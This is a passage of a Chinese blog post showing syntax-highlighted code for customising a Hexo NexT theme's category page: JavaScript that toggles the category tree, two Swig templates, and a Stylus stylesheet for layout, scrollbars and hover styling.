class="keyword">if</span> (index &gt; <span class="number">0</span>) &#123; <span class="comment">// 跳过第一个分类</span></span><br><span class="line">      <span class="keyword">const</span> childList = item.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line">      <span class="keyword">const</span> icon = item.<span class="title function_">querySelector</span>(<span class="string">&#x27;.category-toggle-icon&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (childList &amp;&amp; icon) &#123;</span><br><span class="line">        childList.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">        icon.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;fa-caret-down&#x27;</span>);</span><br><span class="line">        icon.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;fa-caret-right&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 确保第一个分类的子分类展开</span></span><br><span class="line">  <span class="keyword">const</span> firstTopLevelItem = topLevelItems[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> (firstTopLevelItem) &#123;</span><br><span class="line">    <span class="keyword">const</span> childList = firstTopLevelItem.<span class="title function_">querySelector</span>(<span class="string">&#x27;ul&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> icon = firstTopLevelItem.<span class="title function_">querySelector</span>(<span class="string">&#x27;.category-toggle-icon&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (childList &amp;&amp; icon) &#123;</span><br><span class="line">      childList.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&#x27;block&#x27;</span>;</span><br><span class="line">      icon.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">&#x27;fa-caret-down&#x27;</span>);</span><br><span class="line">      icon.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">&#x27;fa-caret-right&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 默认加载第一个分类的文章</span></span><br><span class="line">  <span class="keyword">const</span> firstCategoryLink = container.<span class="title function_">querySelector</span>(<span class="string">&#x27;.category-list-link&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (firstCategoryLink) &#123;</span><br><span class="line">    <span class="keyword">const</span> categoryName = firstCategoryLink.<span class="property">textContent</span>.<span class="title function_">trim</span>();</span><br><span class="line">    <span class="keyword">const</span> categoryPath = firstCategoryLink.<span class="title function_">getAttribute</span>(<span class="string">&#x27;href&#x27;</span>);</span><br><span class="line">    <span class="title function_">loadCategoryPosts</span>(categoryName, categoryPath);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="themes-next-layout-category-swig">themes\next\layout\category.swig</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;post-block&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;posts-collapse&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;collection-title&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">&quot;collection-header&quot;</span>&gt;</span></span><br><span class="line">        &#123;&#123;- page.category &#125;&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">small</span>&gt;</span>&#123;&#123; __(&#x27;title.category&#x27;) &#125;&#125;<span class="tag">&lt;/<span class="name">small</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;category-posts&quot;</span>&gt;</span> <span class="comment">&lt;!-- 添加这个类名 --&gt;</span></span><br><span class="line">    	&#123;&#123; post_template.render(page.posts) &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="themes-next-layout-macro-post-collapse-swig">themes\next\layout_macro\post-collapse.swig</h3>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">article</span> <span class="attr">class</span>=<span class="string">&quot;post post-collapse-item&quot;</span> <span class="attr">itemscope</span> <span class="attr">itemtype</span>=<span class="string">&quot;http://schema.org/Article&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span> <span class="attr">class</span>=<span class="string">&quot;post-header&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">      &lt;div class=&quot;post-meta&quot;&gt;</span></span><br><span class="line"><span class="comment">        &lt;time itemprop=&quot;dateCreated&quot;</span></span><br><span class="line"><span class="comment">              datetime=&quot;&#123;&#123; moment(post.date).format() &#125;&#125;&quot;</span></span><br><span class="line"><span class="comment">              content=&quot;&#123;&#123; date(post.date, config.date_format) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="comment">          &#123;&#123; date(post.date, &#x27;MM-DD&#x27;) &#125;&#125;</span></span><br><span class="line"><span class="comment">        &lt;/time&gt;</span></span><br><span class="line"><span class="comment">      &lt;/div&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;post-title&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;post-meta&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">time</span> <span class="attr">itemprop</span>=<span class="string">&quot;dateCreated&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">datetime</span>=<span class="string">&quot;&#123;&#123; moment(post.date).format() &#125;&#125;&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">content</span>=<span class="string">&quot;&#123;&#123; date(post.date, config.date_format) &#125;&#125;&quot;</span>&gt;</span></span><br><span class="line">            &#123;&#123; date(post.date, &#x27;MM-DD&#x27;) &#125;&#125;</span><br><span class="line">          <span class="tag">&lt;/<span class="name">time</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        &#123;%- if post.link %&#125;&#123;# Link posts #&#125;</span><br><span class="line">          &#123;%- set postTitleIcon = &#x27;<span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fa fa-external-link-alt&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>&#x27; %&#125;</span><br><span class="line">          &#123;%- set postText = post.title or post.link %&#125;</span><br><span class="line">          &#123;&#123; next_url(post.link, postText + postTitleIcon, &#123;class: &#x27;post-title-link post-title-link-external&#x27;, itemprop: &#x27;url&#x27;&#125;) &#125;&#125;</span><br><span class="line">        &#123;% else %&#125;</span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;post-title-link&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;&#123; url_for(post.path) &#125;&#125;&quot;</span> <span class="attr">itemprop</span>=<span class="string">&quot;url&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">itemprop</span>=<span class="string">&quot;name&quot;</span>&gt;</span>&#123;&#123; post.title or __(&#x27;post.untitled&#x27;) &#125;&#125;<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        &#123;%- endif %&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">article</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="source-data-styles-styl">source_data\styles.styl</h3>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 分类页面布局 */</span></span><br><span class="line"><span class="comment">/* ===================== 滚动条美化 - 白色样式 ===================== */</span></span><br><span class="line"><span class="comment">/* 滚动条美化 */</span></span><br><span class="line"><span class="keyword">@supports</span> (<span class="attribute">scrollbar-color</span>: auto) &#123;</span><br><span class="line">  <span class="selector-class">.category-tree</span>,</span><br><span class="line">  <span class="selector-class">.category-posts-container</span> &#123;</span><br><span class="line">    <span class="attribute">scrollbar-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.5</span>) <span class="built_in">rgba</span>(<span class="number">240</span>, <span class="number">240</span>, <span class="number">240</span>, <span class="number">0.5</span>);</span><br><span class="line">    <span class="attribute">scrollbar-width</span>: thin;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ===================== 布局优化 ===================== */</span></span><br><span class="line"><span class="selector-class">.category-container</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">margin-top</span>: <span class="number">30px</span>;</span><br><span class="line">  <span class="attribute">gap</span>: <span class="number">30px</span>;</span><br><span class="line">  <span class="attribute">height</span>: <span class="number">70vh</span>;</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">80px</span>;</span><br><span class="line">  <span class="selector-class">.category-tree</span> &#123;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">48%</span>;</span><br><span class="line">    <span class="attribute">min-width</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">overflow-x</span>: visible;</span><br><span class="line">    <span class="attribute">max-height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">overflow-y</span>: auto; <span class="comment">/* 恢复垂直滚动条 */</span></span><br><span class="line">    <span class="attribute">overflow-x</span>: hidden;</span><br><span class="line">    <span class="attribute">padding-right</span>: <span class="number">10px</span>; </span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex-direction</span>: column;</span><br><span class="line">    <span class="attribute">position</span>: relative; <span class="comment">/* 为滚动条定位做准备 */</span></span><br><span class="line">    <span class="attribute">direction</span>: rtl;</span><br><span class="line">    <span class="comment">/* 添加可滚动区域 */</span></span><br><span class="line">    <span class="comment">/* 左侧分类树滚动区域 */</span></span><br><span class="line"></span><br><span class="line">    &amp;::-webkit-scrollbar &#123;</span><br><span class="line">      <span class="attribute">width</span>: <span class="number">6px</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &amp;::-webkit-scrollbar-thumb &#123;</span><br><span class="line">      <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.8</span>);</span><br><span class="line">      <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="built_in">rgba</span>(<span class="number">200</span>, <span class="number">200</span>, <span class="number">200</span>, <span class="number">0.5</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 确保分类树内容正常显示 */</span></span><br><span class="line"><span class="selector-id">#categoryContainer</span> &#123;</span><br><span class="line">  <span class="attribute">direction</span>: ltr; <span class="comment">/* 内容从左到右 */</span></span><br><span class="line">  <span class="attribute">padding-right</span>: <span class="number">10px</span>; <span class="comment">/* 补偿滚动条宽度 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.category-posts-container</span> &#123;</span><br><span class="line">    <span class="attribute">flex</span>: <span class="number">2</span>;</span><br><span class="line">    <span class="attribute">display</span>: none;</span><br><span class="line">    <span class="attribute">overflow-y</span>: auto;</span><br><span class="line">    <span class="attribute">max-height</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.8</span>); <span class="comment">/* 添加半透明白色背景 */</span></span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">8px</span>; <span class="comment">/* 添加圆角 */</span></span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">10px</span>; <span class="comment">/* 增加内边距 */</span></span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">10px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>); <span class="comment">/* 添加阴影增强层次感 */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 调整分类列表 */</span></span><br><span class="line"><span class="selector-id">#categoryContainer</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: block;</span><br><span class="line">  //<span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">0</span>;</span><br><span class="line">  <span class="selector-class">.category-list</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">max-height</span>: none;</span><br><span class="line">    <span class="attribute">margin-right</span>: <span class="number">8px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 分类项样式优化 */</span></span><br><span class="line"><span class="selector-class">.category-list-item</span> &#123;</span><br><span class="line">  <span class="attribute">overflow</span>: visible; <span class="comment">/* 确保内容可见 */</span></span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">  <span class="attribute">min-width</span>: <span class="number">0</span>; <span class="comment">/* 允许内容收缩 */</span></span><br><span class="line">  <span class="attribute">flex-wrap</span>: wrap;</span><br><span class="line">  <span class="attribute">align-items</span>: center;</span><br><span class="line">  <span class="attribute">margin-bottom</span>: <span class="number">6px</span>;</span><br><span class="line">  <span class="attribute">margin</span>: <span class="number">5px</span> <span class="number">0px</span>;</span><br><span class="line">  <span class="attribute">position</span>: relative;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.2</span>); <span class="comment">/* 默认透明背景 */</span></span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">6px</span>;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">5px</span> <span class="number">8px</span>;</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">0.3s</span> ease;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 确保子分类不会导致溢出 */</span></span><br><span class="line">  <span class="selector-class">.category-list-child</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">90%</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="selector-class">.category-list-link</span> &#123;</span><br><span class="line">    <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">overflow</span>: hidden;</span><br><span class="line">    <span class="attribute">text-overflow</span>: ellipsis;</span><br><span class="line">    <span class="attribute">white-space</span>: nowrap;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">2px</span> <span class="number">9px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#2c3e50</span>;</span><br><span class="line">    <span class="attribute">text-decoration</span>: none <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">transition</span>: all <span class="number">0.3s</span>;</span><br><span class="line">    </span><br><span class="line">    &amp;<span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">      <span class="attribute">background-color</span>: <span class="number">#cccccc</span>;</span><br><span class="line">      <span class="attribute">color</span>: <span class="number">#2841a4f7</span>;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="selector-class">.category-list-count</span> &#123;</span><br><span class="line">    <span class="attribute">flex-shrink</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#eaeef5</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#6c757d</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.6rem</span> <span class="meta">!important</span>; <span class="comment">/* 进一步缩小字体大小 */</span></span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">2px</span> <span class="number">2px</span>; <span class="comment">/* 减小内边距 */</span></span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">transition</span>: all <span class="number">0.3s</span>;</span><br><span class="line">    <span class="attribute">min-width</span>: <span class="number">20px</span>; <span class="comment">/* 设置最小宽度 */</span></span><br><span class="line">    <span class="attribute">text-align</span>: center; <span class="comment">/* 居中显示 */</span></span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 折叠图标样式 */</span></span><br><span class="line">  <span class="selector-class">.category-toggle-icon</span> &#123;</span><br><span class="line">    <span class="attribute">flex-shrink</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#6c757d</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.9rem</span>;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">transition</span>: transform <span class="number">0.3s</span> ease;</span><br><span class="line">    <span class="attribute">min-width</span>: <span class="number">30px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  &amp;<span class="selector-pseudo">:hover</span> <span class="selector-class">.category-list-count</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#d1e0ff</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#4b6cb7</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 为不同层级添加背景色（降低透明度） */</span></span><br><span class="line"><span class="comment">/* 第一级分类 */</span></span><br><span class="line"><span class="selector-id">#categoryContainer</span> &gt; <span class="selector-class">.category-list</span> &gt; <span class="selector-class">.category-list-item</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.85</span>); <span class="comment">/* 降低透明度 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 第二级分类 */</span></span><br><span class="line"><span class="selector-id">#categoryContainer</span> &gt; <span class="selector-class">.category-list</span> &gt; <span class="selector-class">.category-list-item</span> &gt; <span class="selector-class">.category-list-child</span> &gt; <span class="selector-class">.category-list-item</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">200</span>, <span class="number">230</span>, <span class="number">255</span>, <span class="number">0.5</span>); <span class="comment">/* 降低透明度 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 第三级分类 */</span></span><br><span class="line"><span class="selector-id">#categoryContainer</span> &gt; <span class="selector-class">.category-list</span> &gt; <span class="selector-class">.category-list-item</span> &gt; <span class="selector-class">.category-list-child</span> &gt; <span class="selector-class">.category-list-item</span> &gt; <span class="selector-class">.category-list-child</span> &gt; <span class="selector-class">.category-list-item</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">230</span>, <span class="number">255</span>, <span class="number">230</span>, <span class="number">0.5</span>); <span class="comment">/* 降低透明度 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 第四级分类 */</span></span><br><span class="line"><span class="selector-id">#categoryContainer</span> &gt; <span class="selector-class">.category-list</span> &gt; <span class="selector-class">.category-list-item</span> &gt; <span class="selector-class">.category-list-child</span> &gt; <span class="selector-class">.category-list-item</span> &gt; <span class="selector-class">.category-list-child</span> &gt; <span class="selector-class">.category-list-item</span> &gt; <span class="selector-class">.category-list-child</span> &gt; <span class="selector-class">.category-list-item</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">230</span>, <span class="number">230</span>, <span class="number">0.5</span>); <span class="comment">/* 降低透明度 */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 悬停效果 - 只改变当前项 */</span></span><br><span class="line"><span class="comment">/* 只悬停当前项 */</span></span><br><span class="line"><span class="selector-class">.category-list-item</span><span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">240</span>, <span class="number">248</span>, <span class="number">255</span>, <span class="number">0.7</span>) <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">20</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 添加以下样式到您的 styles.styl 文件中 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 当前选中分类样式 */</span></span><br><span class="line"><span class="selector-class">.category-list-link</span><span class="selector-class">.active-category</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="number">#4b6cb7</span> <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">color</span>: white <span class="meta">!important</span>;</span><br><span class="line">  </span><br><span class="line">  &amp; + <span class="selector-class">.category-list-count</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: white <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#4b6cb7</span> <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 祖先分类样式 */</span></span><br><span class="line"><span class="selector-class">.category-list-item</span><span class="selector-class">.active-ancestor</span> &gt; <span class="selector-class">.category-list-link</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">200</span>, <span class="number">230</span>, <span class="number">255</span>, <span class="number">0.7</span>) <span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 响应式设计优化 */</span></span><br><span class="line"><span class="keyword">@media</span> (<span class="attribute">max-width</span>: <span class="number">768px</span>) &#123;</span><br><span class="line">  <span class="selector-class">.category-container</span> &#123;</span><br><span class="line">    <span class="selector-class">.category-tree</span>,</span><br><span class="line">    <span class="selector-class">.category-posts-container</span> &#123;</span><br><span class="line">      <span class="attribute">flex</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">100%</span>; <span class="comment">/* 移动端占满宽度 */</span></span><br><span class="line">      <span class="attribute">min-width</span>: <span class="number">100%</span>;</span><br><span class="line">      <span class="attribute">max-height</span>: none;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="selector-class">.category-tree</span> &#123;</span><br><span class="line">      <span class="attribute">direction</span>: ltr; <span class="comment">/* 移动端恢复默认方向 */</span></span><br><span class="line">      <span class="attribute">padding-right</span>: <span class="number">0</span>;</span><br><span class="line">      <span class="attribute">max-height</span>: <span class="number">40vh</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 确保右侧标题可见 */</span></span><br><span class="line"><span class="selector-class">.collection-header</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#333333</span> <span class="meta">!important</span>;</span><br><span class="line">  <span class="attribute">text-shadow</span>: none;</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="selector-id">#currentCategoryName</span> &#123;</span><br><span class="line">    <span class="attribute">font-weight</span>: bold;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">1.5rem</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#222</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  small &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#666</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">1rem</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 文章列表视觉优化 */</span></span><br><span class="line"><span class="selector-id">#categoryPostsList</span> &#123;</span><br><span class="line">  * &#123;</span><br><span class="line">    <span class="attribute">opacity</span>: <span class="number">1</span> <span class="meta">!important</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="selector-class">.post-title-link</span>, </span><br><span class="line">  <span class="selector-class">.post-title-link</span> <span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#111111</span> <span class="meta">!important</span>;</span><br><span class="line">    //<span class="attribute">font-weight</span>: <span class="number">600</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">1rem</span> <span class="meta">!important</span>;</span><br><span class="line">    </span><br><span class="line">    &amp;<span class="selector-pseudo">:hover</span> &#123;</span><br><span class="line">      <span class="attribute">color</span>: <span class="number">#4b6cb7</span> <span class="meta">!important</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="selector-class">.post-meta</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">2px</span> <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.9em</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#666</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0.85rem</span> <span class="meta">!important</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">3px</span> <span class="number">0</span> <span class="number">3px</span> <span class="number">5px</span>;</span><br><span class="line"></span><br><span class="line">    <span class="selector-tag">time</span> &#123;</span><br><span class="line">      <span class="attribute">border</span>: <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="selector-class">.post-header</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">flex-direction</span>: column;</span><br><span class="line">    <span class="attribute">align-items</span>: center;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0px</span> <span class="number">15px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">8px</span> <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#f0f0f0</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.3</span>);</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">4px</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">8px</span> <span class="number">12px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="selector-class">.post-title</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>: block;</span><br><span class="line">    <span class="attribute">height</span>: auto;</span><br><span class="line">    min_height: <span class="number">1em</span>;</span><br><span class="line">    <span class="attribute">overflow-wrap</span>: break-word;</span><br><span class="line">    <span class="attribute">overflow</span>: visible;</span><br><span class="line">    <span class="attribute">flex-grow</span>: <span class="number">1</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#f8f8f8</span>; <span class="comment">/* 仅用于调试 */</span></span><br><span class="line">    <span class="attribute">line-height</span>: <span class="number">1.5</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0</span>;</span><br><span class="line">    <span class="attribute">padding</span>: <span class="number">15px</span> <span class="number">0</span> <span class="number">10px</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  <span class="selector-class">.collection-year</span> &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">1.2rem</span>;</span><br><span class="line">    <span class="attribute">font-weight</span>: <span class="number">600</span>;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#444</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span> <span class="number">10px</span>;</span><br><span class="line">    <span class="attribute">padding-bottom</span>: <span class="number">5px</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> dashed <span class="number">#ddd</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 加载动画优化 */</span></span><br><span class="line"><span class="selector-class">.loading-spinner</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: inline-block;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">20px</span>;</span><br><span class="line">  <span 